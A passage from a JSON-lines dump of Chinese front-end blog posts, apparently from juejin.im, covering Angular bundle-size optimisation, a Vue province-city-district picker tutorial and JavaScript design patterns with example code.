\u003ccode\u003e@angular/platform-browser\u003c/code\u003e。其中具备两个重要类型，一个是 \u003ccode\u003eplatformBrowser\u003c/code\u003e，另一个是 \u003ccode\u003eBrowserModule\u003c/code\u003e。\u003ccode\u003eplatformBrowser\u003c/code\u003e 是一个 \u003ccode\u003ePlatformFactory\u003c/code\u003e，其中包含了一系列预制的基础 \u003ccode\u003eProvider\u003c/code\u003e；而 \u003ccode\u003eBrowserModule\u003c/code\u003e 是一个 \u003ccode\u003eNgModule\u003c/code\u003e，通常由应用根模块导入，除了包含了一些 \u003ccode\u003eProvider\u003c/code\u003e 外，也导入了另一些其它的 \u003ccode\u003eNgModule\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e由于 Angular 良好的工程化特性，真正实现了模块间的解耦，因此我们完全可以不引入 \u003ccode\u003eBrowserModule\u003c/code\u003e，而是自行提供其中的必要部分。\u003c/p\u003e\n\u003cp\u003e最终\u003csup\u003e8\u003c/sup\u003e，我们仅仅需要自行实现一个 \u003ca target=\"_blank\" href=\"https://angular.io/api/core/Renderer2\"\u003e\u003ccode\u003eRenderer\u003c/code\u003e\u003c/a\u003e，使用不到一百行的代码就能完全规避对 \u003ccode\u003eBrowserModule\u003c/code\u003e 的导入，避免引入其它无用部分。\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e8. 该部分完成过程可以参考 \u003ca target=\"_blank\" href=\"https://www.zhihu.com/question/57937374/answer/233075544\"\u003e按官方说法，angular2是基于Web组件的开发平台，为什么却把它当做前端框架来用？ - Trotyl Yu的回答 - 知乎\u003c/a\u003e。\u003c/em\u003e \u003c/sub\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e去除 Debug Helpers\u003c/h2\u003e\n\u003cp\u003e在 Angular 中，我们通过 \u003ca target=\"_blank\" href=\"https://angular.io/api/core/enableProdMode\"\u003e\u003ccode\u003eenableProdMode\u003c/code\u003e\u003c/a\u003e API 来进入生产模式，关闭不必要的调试功能，提供应用性能。不过，由于该方法通过修改模块局部变量来保存状态，所以即便是在生产模式中，调试相关的代码仍然无法被去除\u003csup\u003e9\u003c/sup\u003e，即使是 Closure Compiler 这样恐怖如斯的斗宗强者也无能为力。\u003c/p\u003e\n\u003cp\u003e而对于查询应用是否在生产模式，是通过 \u003ca target=\"_blank\" href=\"https://angular.io/api/core/isDevMode\"\u003e\u003ccode\u003eisDevMode\u003c/code\u003e\u003c/a\u003e API 来进行的，不仅是用户，内部判断也同样是通过这个。为此，我们只需要将 \u003ccode\u003eisDevMode\u003c/code\u003e 修改为 \u003ccode\u003ereturn false\u003c/code\u003e，即可切断调试服务与内部状态间的依赖，使其被成功去除。\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e9. 问题记录见 \u003ca target=\"_blank\" href=\"https://github.com/angular/devkit/issues/244\"\u003e[angular/core] make DebugServices treeshakable (~10KB savings)\u003c/a\u003e。由于 v6 版本中使用了全新的渲染引擎，将使用全局变量来判断 devMode，因此能够原生支持大部分构建工具的优化，所以最终可能并不需要通过 Build Optimizer 来解决。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e通过多种优化的组合，我们便可以将 Todo MVC 的应用大小控制在 30KB 左右，在绝大多数 3G 甚至部分 2G 网络上都能立即加载。\u003c/p\u003e\n\u003cp\u003e当然，实际工程实践中并不是所有这些优化都有必要（部分固定大小的优化项，随着应用自身大小的增大可能不再作为瓶颈）。\u003c/p\u003e\n\u003cp\u003e完整的 Demo 可以参见 \u003ca target=\"_blank\" href=\"https://github.com/trotyl/ng-slim-demo\"\u003etrotyl/ng-slim-demo: Count Angular project size for Todo MVC with different optimization\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e\u003csub style=\"visibility: hidden\"\u003e本文地址：\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a37765ff265da430f323271\"\u003ehttps://juejin.im/post/5a37765ff265da430f323271\u003c/a\u003e\u003c/sub\u003e\u003c/p\u003e\n","buildTime":"1514640121.8051","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0707"},"id":"5a2a8c985188250a5719a707","author":{"$oid":"5a4b770f19da8721f49c06f4"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"vue+webpack+amaze-vue实现省市区联动选择组件","meta":{"likeCount":0},"tag":["Vue.js","前端","前端框架"],"comment":[],"shortContent":"将提示准备好的location.js 文件拷贝到src目录下。 同学可以根据自己的情况自己拷入城市数据，代码里提供的数据仅供参考。 此demo只是提供一个思路去解决联动选择的问题，线上需求还请使用的同学根据具体情况优化代码后使用。","content":"\u003ch2 class=\"heading\"\u003e创建工程\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e创建工程目录 \u003ccode\u003evue-city-picker\u003c/code\u003e\u003c/h3\u003e\n\u003ch3 class=\"heading\"\u003e使用\u003ccode\u003evue-cli\u003c/code\u003e初始化webpack工程\u003c/h3\u003e\n\u003cp\u003e如果没有安装\u003ccode\u003evue-cli\u003c/code\u003e的同学请走 \u003ca target=\"_blank\" href=\"https://www.cnblogs.com/loveyaxin/p/7094089.html\"\u003e传送门\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003evue-city-picker\u003c/code\u003e同级目录下执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evue init webpack vue-city-picker\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来出现的提示可以参考下图\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"vue-cli安装提示\" src=\"https://user-gold-cdn.xitu.io/2017/12/8/16036352d0a6e010?w=804\u0026amp;h=318\u0026amp;f=jpeg\u0026amp;s=65712\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003enpm安装\u003ca target=\"_blank\" href=\"https://github.com/sunshineJi/amaze-vue\"\u003eamaze-vue\u003c/a\u003e\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e vue-city-picker\nnpm npm install amaze-vue --save\nnpm install\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e开发准备\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e启动webpack-dev-server\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0009npm run dev\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时在浏览器中访问\u003ccode\u003ehttp://127.0.0.1:8080/\u003c/code\u003e就可以访问了\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e整理目录（没有代码洁癖的请自行跳过）\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e删除 \u003ccode\u003esrc/assets\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e删除 \u003ccode\u003esrc/components\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e清空 \u003ccode\u003esrc/App.vue\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e拷入城市数据\u003c/h3\u003e\n\u003cp\u003e将提示准备好的\u003ccode\u003elocation.js\u003c/code\u003e 文件拷贝到\u003ccode\u003esrc\u003c/code\u003e目录下。\n同学可以根据自己的情况自己拷入城市数据，代码里提供的数据仅供参考。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开始开发\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e编辑\u003ccode\u003esrc/main.js\u003c/code\u003e 引入\u003ca target=\"_blank\" href=\"https://github.com/sunshineJi/amaze-vue\"\u003eamaze-vue\u003c/a\u003e组件库\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e App \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./App'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e AmazeVue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'amaze-vue'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'amaze-vue/dist/amaze-vue.css'\u003c/span\u003e;\n\nVue.config.productionTip = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nVue.use(AmazeVue);\n\n\u003cspan class=\"hljs-comment\"\u003e/* eslint-disable no-new */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Vue({\n  \u003cspan class=\"hljs-attr\"\u003eel\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003etemplate\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;App/\u0026gt;'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003ecomponents\u003c/span\u003e: { App }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e编辑\u003ccode\u003esrc/App.vue\u003c/code\u003e\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u0026lt;template\u0026gt;\n    \u0026lt;div class=\"container\"\u0026gt;\n        \u0026lt;section class=\"city-picker\"\u0026gt;\n            \u0026lt;am-select @select=\"proviceHandle\" :options=\"province\" search placeholder=\"请选择省、直辖市\"\u0026gt;\u0026lt;/am-select\u0026gt;\n            \u0026lt;am-select v-if=\"city.length \u0026gt; 0\" @select=\"cityHandle\" search :options=\"city\" placeholder=\"请选择市、区\"\u0026gt;\u0026lt;/am-select\u0026gt;\n            \u0026lt;am-select v-if=\"county.length \u0026gt; 0\" @select=\"countyHandle\" search :options=\"county\" placeholder=\"请选择区、县\"\u0026gt;\u0026lt;/am-select\u0026gt;\n        \u0026lt;/section\u0026gt;\n        \u0026lt;p v-if=\"address\"\u0026gt;您选择的是：\u0026lt;span class=\"am-text-success\"\u0026gt;{{ address }}\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/template\u0026gt;\n\n\u0026lt;script\u0026gt;\n    import locationData from './location';\n\n    export default {\n        name: 'city-picker',\n        data() {\n            const province = [];\n            for (let code in locationData) {\n                let item = locationData[code];\n                province.push(Object.assign(item, {\n                    label: item.name\n                }));\n            }\n            return {\n                province,\n                city: [],\n                county: [],\n                selectProvince: null,\n                selectCity: null,\n                selectCounty: null\n            };\n        },\n        methods: {\n            proviceHandle(value) {\n                const city = [];\n                for (let code in value.cities) {\n                    let item = value.cities[code];\n                    city.push(Object.assign(item, {\n                        label: item.name\n                    }));\n                }\n                this.city = city;\n                this.county = [];\n                this.selectProvince = value.name;\n                this.selectCity = null;\n                this.selectCounty = null;\n            },\n            cityHandle(value) {\n                const county = [];\n                for (let code in value.districts) {\n                    let item = value.districts[code];\n                    county.push({\n                        code,\n                        label: item,\n                        name: item\n                    });\n                }\n                this.county = county;\n                this.selectCity = value.name;\n                this.selectCounty = null;\n            },\n            countyHandle(value) {\n                this.selectCounty = value.name;\n            }\n        },\n        computed: {\n            address() {\n                const { selectProvince, selectCity, selectCounty } = this;\n                return (selectProvince ? selectProvince : '') +\n                    (selectCity ? '，' + selectCity : '') +\n                    (selectCounty ? '，' + selectCounty : '');\n            }\n        }\n    }\n\u0026lt;/script\u0026gt;\n\n\u0026lt;style\u0026gt;\n    .container {\n        width: 800px;\n        height: 800px;\n        padding-top: 80px;\n        margin: auto;\n    }\n    .city-picker {\n        margin-bottom: 20px;\n    }\n\u0026lt;/style\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e实现效果\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e效果图\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"效果图\" src=\"https://user-gold-cdn.xitu.io/2017/12/8/16036352d24d615f?w=1554\u0026amp;h=856\u0026amp;f=jpeg\u0026amp;s=54275\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e代码\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ehttps://github.com/sunshineJi/vue-city-picker\u003c/code\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用方法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003egit \u003cspan class=\"hljs-built_in\"\u003eclone\u003c/span\u003e https://github.com/sunshineJi/vue-city-picker.git\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e vue-city-picker\nnpm i\nnpm run dev\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e提示\u003c/h2\u003e\n\u003cp\u003e此demo只是提供一个思路去解决联动选择的问题，线上需求还请使用的同学根据具体情况优化代码后使用。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e广告ಠ౪ಠ\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/sunshineJi/amaze-vue\"\u003eamaze-vue\u003c/a\u003e是一只基于amazeui 和 vue.js的响应式组件库，项目刚刚起步，希望大家多多支持。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e项目地址\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/sunshineJi/amaze-vue\"\u003eamaze-vue\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用文档\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://sunshineji.github.io/amaze-vue-docs/\"\u003edocument\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514873434.894","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0705"},"id":"59df4f74f265da430f311909","author":{"$oid":"5a4b770f19da8721f49c06f5"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript设计模式","meta":{"likeCount":0},"tag":["设计模式","JavaScript","前端","API"],"comment":[],"shortContent":"当然我们可以用一个通俗的说法：设计模式是解决某个特定场景下对某种问题的解决方案。因此，当我们遇到合适的场景时，我们可能会条件反射一样自然而然想到符合这种场景的设计模式。 比如，当系统中某个接口的结构已经无法满足我们现在的业务需求，但又不能改动这个接口，因为可能原来的系统很多功能…","content":"\u003cblockquote\u003e\n\u003cp\u003e设计模式的定义：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e当然我们可以用一个通俗的说法：设计模式是解决某个特定场景下对某种问题的解决方案。因此，当我们遇到合适的场景时，我们可能会条件反射一样自然而然想到符合这种场景的设计模式。\u003c/p\u003e\n\u003cp\u003e比如，当系统中某个接口的结构已经无法满足我们现在的业务需求，但又不能改动这个接口，因为可能原来的系统很多功能都依赖于这个接口，改动接口会牵扯到太多文件。因此应对这种场景，我们可以很快地想到可以用适配器模式来解决这个问题。\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e下面介绍几种在JavaScript中常见的几种设计模式：\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"1-\"\u003e1.单例模式\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e单例模式的定义：保证一个类仅有一个实例，并提供一个访问它的全局访问点。实现的方法为先判断实例存在与否，如果存在则直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e适用场景：一个单一对象。比如：弹窗，无论点击多少次，弹窗只应该被创建一次。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eCreateUser\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.getName();\n    }\n    getName() {\n         \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name;\n    }\n}\n\u003cspan class=\"hljs-comment\"\u003e// 代理实现单例模式\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ProxyMode = (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e instance = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!instance) {\n            instance = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e CreateUser(name);\n        }\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e instance;\n    }\n})();\n\u003cspan class=\"hljs-comment\"\u003e// 测试单体模式的实例\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ProxyMode(\u003cspan class=\"hljs-string\"\u003e\"aaa\"\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ProxyMode(\u003cspan class=\"hljs-string\"\u003e\"bbb\"\u003c/span\u003e);\n\u003cspan class=\"hljs-comment\"\u003e// 因为单体模式是只实例化一次，所以下面的实例是相等的\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a === b);    \u003cspan class=\"hljs-comment\"\u003e//true\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"2-\"\u003e2.策略模式\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e策略模式的定义：定义一系列的算法，把他们一个个封装起来，并且使他们可以相互替换。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e策略模式的目的就是将算法的使用算法的实现分离开来。\u003c/p\u003e\n\u003cp\u003e一个基于策略模式的程序至少由两部分组成。第一个部分是一组策略类（可变），策略类封装了具体的算法，并负责具体的计算过程。第二个部分是环境类Context（不变），Context接受客户的请求，随后将请求委托给某一个策略类。要做到这一点，说明Context中要维持对某个策略对象的引用。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/*策略类*/\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e levelOBJ = {\n    \u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emoney\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e money * \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e;\n    },\n    \u003cspan class=\"hljs-string\"\u003e\"B\"\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emoney\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e money * \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n    },\n    \u003cspan class=\"hljs-string\"\u003e\"C\"\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emoney\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e money * \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n    } \n};\n\u003cspan class=\"hljs-comment\"\u003e/*环境类*/\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e calculateBouns =\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003elevel,money\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e levelOBJ[level](money);\n};\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(calculateBouns(\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e)); \u003cspan class=\"hljs-comment\"\u003e// 40000\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"3-\"\u003e3.代理模式\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e代理模式的定义：为一个对象提供一个代用品或占位符，以便控制对它的访问。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e常用的虚拟代理形式：某一个花销很大的操作，可以通过虚拟代理的方式延迟到这种需要它的时候才去创建（例：使用虚拟代理实现图片懒加载）\u003c/p\u003e\n\u003cp\u003e图片懒加载的方式：先通过一张loading图占位，然后通过异步的方式加载图片，等图片加载好了再把完成的图片加载到img标签里面。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e imgFunc = (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e imgNode = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createElement(\u003cspan class=\"hljs-string\"\u003e'img'\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.body.appendChild(imgNode);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-attr\"\u003esetSrc\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esrc\u003c/span\u003e) \u003c/span\u003e{\n            imgNode.src = src;\n        }\n    }\n})();\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e proxyImage = (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e img = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image();\n    img.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        imgFunc.setSrc(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.src);\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-attr\"\u003esetSrc\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esrc\u003c/span\u003e) \u003c/span\u003e{\n            imgFunc.setSrc(\u003cspan class=\"hljs-string\"\u003e'./loading,gif'\u003c/span\u003e);\n            img.src = src;\n        }\n    }\n})();\nproxyImage.setSrc(\u003cspan class=\"hljs-string\"\u003e'./pic.png'\u003c/span\u003e);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e使用代理模式实现图片懒加载的优点还有符合单一职责原则。减少一个类或方法的粒度和耦合度。\u003c/p\u003e\n\u003ch2 id=\"4-\"\u003e4.中介者模式\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e中介者模式的定义：通过一个中介者对象，其他所有的相关对象都通过该中介者对象来通信，而不是相互引用，当其中的一个对象发生改变时，只需要通知中介者对象即可。通过中介者模式可以解除对象与对象之间的紧耦合关系。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e例如：现实生活中，航线上的飞机只需要和机场的塔台通信就能确定航线和飞行状态，而不需要和所有飞机通信。同时塔台作为中介者，知道每架飞机的飞行状态，所以可以安排所有飞机的起降和航线安排。\u003c/p\u003e\n\u003cp\u003e中介者模式适用的场景：例如购物车需求，存在商品选择表单、颜色选择表单、购买数量表单等等，都会触发change事件，那么可以通过中介者来转发处理这些事件，实现各个事件间的解耦，仅仅维护中介者对象即可。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e goods = {   \u003cspan class=\"hljs-comment\"\u003e//手机库存\u003c/span\u003e\n    \u003cspan class=\"hljs-string\"\u003e'red|32G'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'red|64G'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'blue|32G'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'blue|32G'\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\n};\n\u003cspan class=\"hljs-comment\"\u003e//中介者\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e mediator = (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e colorSelect = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e'colorSelect'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e memorySelect = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e'memorySelect'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e numSelect = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e'numSelect'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        \u003cspan class=\"hljs-attr\"\u003echanged\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eobj\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e(obj){\n                \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e colorSelect:\n                    \u003cspan class=\"hljs-comment\"\u003e//TODO\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n                \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e memorySelect:\n                    \u003cspan class=\"hljs-comment\"\u003e//TODO\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n                \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e numSelect:\n                    \u003cspan class=\"hljs-comment\"\u003e//TODO\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n            }\n        }\n    }\n})();\ncolorSelect.onchange = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    mediator.changed(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n};\nmemorySelect.onchange = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    mediator.changed(\u003cspan 